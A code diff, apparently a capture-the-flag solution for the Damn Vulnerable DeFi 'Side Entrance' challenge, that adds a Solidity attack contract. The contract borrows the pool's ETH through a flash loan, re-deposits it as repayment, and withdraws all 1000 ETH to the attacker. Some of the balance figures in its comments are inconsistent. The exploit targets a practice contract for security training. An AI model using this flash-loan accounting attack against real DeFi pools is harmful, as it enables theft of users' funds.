@@ -35,8 +35,17 @@ contract SideEntrance is Test {
     function testExploit() public {
         /**
          * EXPLOIT START *
-         */
+         */ 
+        // Got 1 ETH
+        // Goal is to take out all 1000ETH fromt the pool
+        Hack hack = new Hack(address(sideEntranceLenderPool));
+        vm.prank(attacker);
+        hack.attack();
+        vm.prank(attacker);
+        hack.withdraw();
 
+        // flashoan 1000ETH => poolBalance = 10ETH
+        // deposit 1010ETH => poolBalance = 0ETH
         /**
          * EXPLOIT END *
          */
@@ -49,3 +58,29 @@ contract SideEntrance is Test {
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
 }
+ 
+ contract Hack {
+    SideEntranceLenderPool internal sideEntranceLenderPool;
+    address payable internal attacker;
+  uint256 ETHER_IN_POOL = 1_000e18;
+
+    constructor(address _sideEntranceLenderPool) {
+        sideEntranceLenderPool = SideEntranceLenderPool(_sideEntranceLenderPool);
+      
+    }
+
+    function attack() external  {
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+    }
+
+    function execute() external payable  {
+        sideEntranceLenderPool.deposit{value: ETHER_IN_POOL}();
+    
+    }
+
+    function withdraw() external {
+        sideEntranceLenderPool.withdraw();
+        selfdestruct(payable(msg.sender));
+    }
+    receive() external payable {}
+ }
